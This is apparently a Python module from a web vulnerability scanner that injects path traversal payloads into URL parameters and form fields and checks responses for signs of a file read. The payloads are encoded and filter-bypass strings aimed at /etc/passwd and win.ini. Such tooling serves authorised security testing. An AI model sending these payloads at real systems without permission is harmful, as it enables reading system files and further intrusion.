"""
Generic Path Traversal Scanner
"""
from src.scanners.base import BaseScanner
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

class PathTraversalScanner(BaseScanner):
    def __init__(self, session, logger, verbose=False):
        super().__init__(session, logger, verbose)
        self.payloads = [
            "../../../../etc/passwd",
            "..\\..\\..\\..\\windows\\win.ini",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//....//etc/passwd",
            "/etc/passwd",
            "C:\\windows\\win.ini",
        ]
        self.indicators = [
            "root:", "daemon:", "bin:", "sys:",
            "[extensions]", "for 16-bit app support",
            "localhost", "::1",
        ]

    def test_url(self, url, method='GET'):
        self.logger.debug(f"Testing URL for path traversal: {url}")
        parsed = urlparse(url)
        params = parse_qs(parsed.query) if parsed.query else {}
        if not params:
            return False

        for param in params:
            for payload in self.payloads:
                injected_url = self._inject_parameter(url, param, payload)
                if not injected_url:
                    continue
                try:
                    response = self.session.get(injected_url, timeout=10)
                    if self._is_path_traversal_successful(response.text):
                        self.logger.warning(f"📂 Path traversal found: {url} param={param} payload={payload}")
                        self.vulnerabilities_found.append({
                            "type": "Path Traversal",
                            "url": url,
                            "parameter": param,
                            "payload": payload,
                            "severity": "High"
                        })
                        return True
                except Exception as e:
                    self.logger.debug(f"Error testing {param}: {e}")
        return False

    def test_form(self, form):
        self.logger.debug(f"Testing form for path traversal: {form['url']}")
        inputs = form.get('inputs', [])
        testable = [i for i in inputs if i.get('name')]
        if not testable:
            return False

        for inp in testable:
            param = inp['name']
            for payload in self.payloads:
                data = self._build_form_data(form, param, payload)
                try:
                    if form['method'].upper() == 'POST':
                        response = self.session.post(form['url'], data=data, timeout=10)
                    else:
                        response = self.session.get(form['url'], params=data, timeout=10)
                    if self._is_path_traversal_successful(response.text):
                        self.logger.warning(f"📂 Path traversal found in form {form['url']} param={param} payload={payload}")
                        self.vulnerabilities_found.append({
                            "type": "Path Traversal",
                            "url": form['url'],
                            "parameter": param,
                            "payload": payload,
                            "severity": "High"
                        })
                        return True
                except Exception as e:
                    self.logger.debug(f"Error testing form {param}: {e}")
        return False

    def _is_path_traversal_successful(self, response_text):
        text = response_text.lower()
        for indicator in self.indicators:
            if indicator.lower() in text:
                return True
        return False